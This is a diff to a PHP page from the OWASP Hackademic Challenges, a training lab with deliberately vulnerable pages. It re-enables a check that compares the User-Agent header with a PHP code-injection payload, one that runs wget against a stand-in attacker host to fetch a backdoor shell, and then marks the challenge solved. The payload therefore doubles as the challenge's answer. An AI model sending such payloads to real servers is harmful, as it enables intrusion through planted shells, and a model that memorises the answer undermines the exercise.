@@ -1,15 +1,15 @@
 <?php
 
-/** 
+/**
  *    ----------------------------------------------------------------
  *    OWASP Hackademic Challenges Project
  *    ----------------------------------------------------------------
- *    Copyright (C) 2010-2011 
+ *    Copyright (C) 2010-2011
  *   	  Andreas Venieris [venieris@owasp.gr]
  *   	  Anastasios Stasinopoulos [anast@owasp.gr]
  *    ----------------------------------------------------------------
  */
- 
+
 ?>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
@@ -104,12 +104,12 @@ if((!isset($shiz)) && (!isset($page))){
 }else{
 	if ($page == "answer.php"){
 		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
-/*
+
 			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
 			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
 			{
 				echo "The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>";
-			//	$monitor->update(CHALLENGE_SUCCESS);
+				$monitor->update(CHALLENGE_SUCCESS);
 			}
 			//elseif (preg_match("/-O (.*).php/",$ua))
 			//{
@@ -118,8 +118,8 @@ if((!isset($shiz)) && (!isset($page))){
 			else
 			{
 			        $monitor->update(CHALLENGE_FAILURE);
-*/				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
-		//	}
+				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
+			}
 	}
 
 
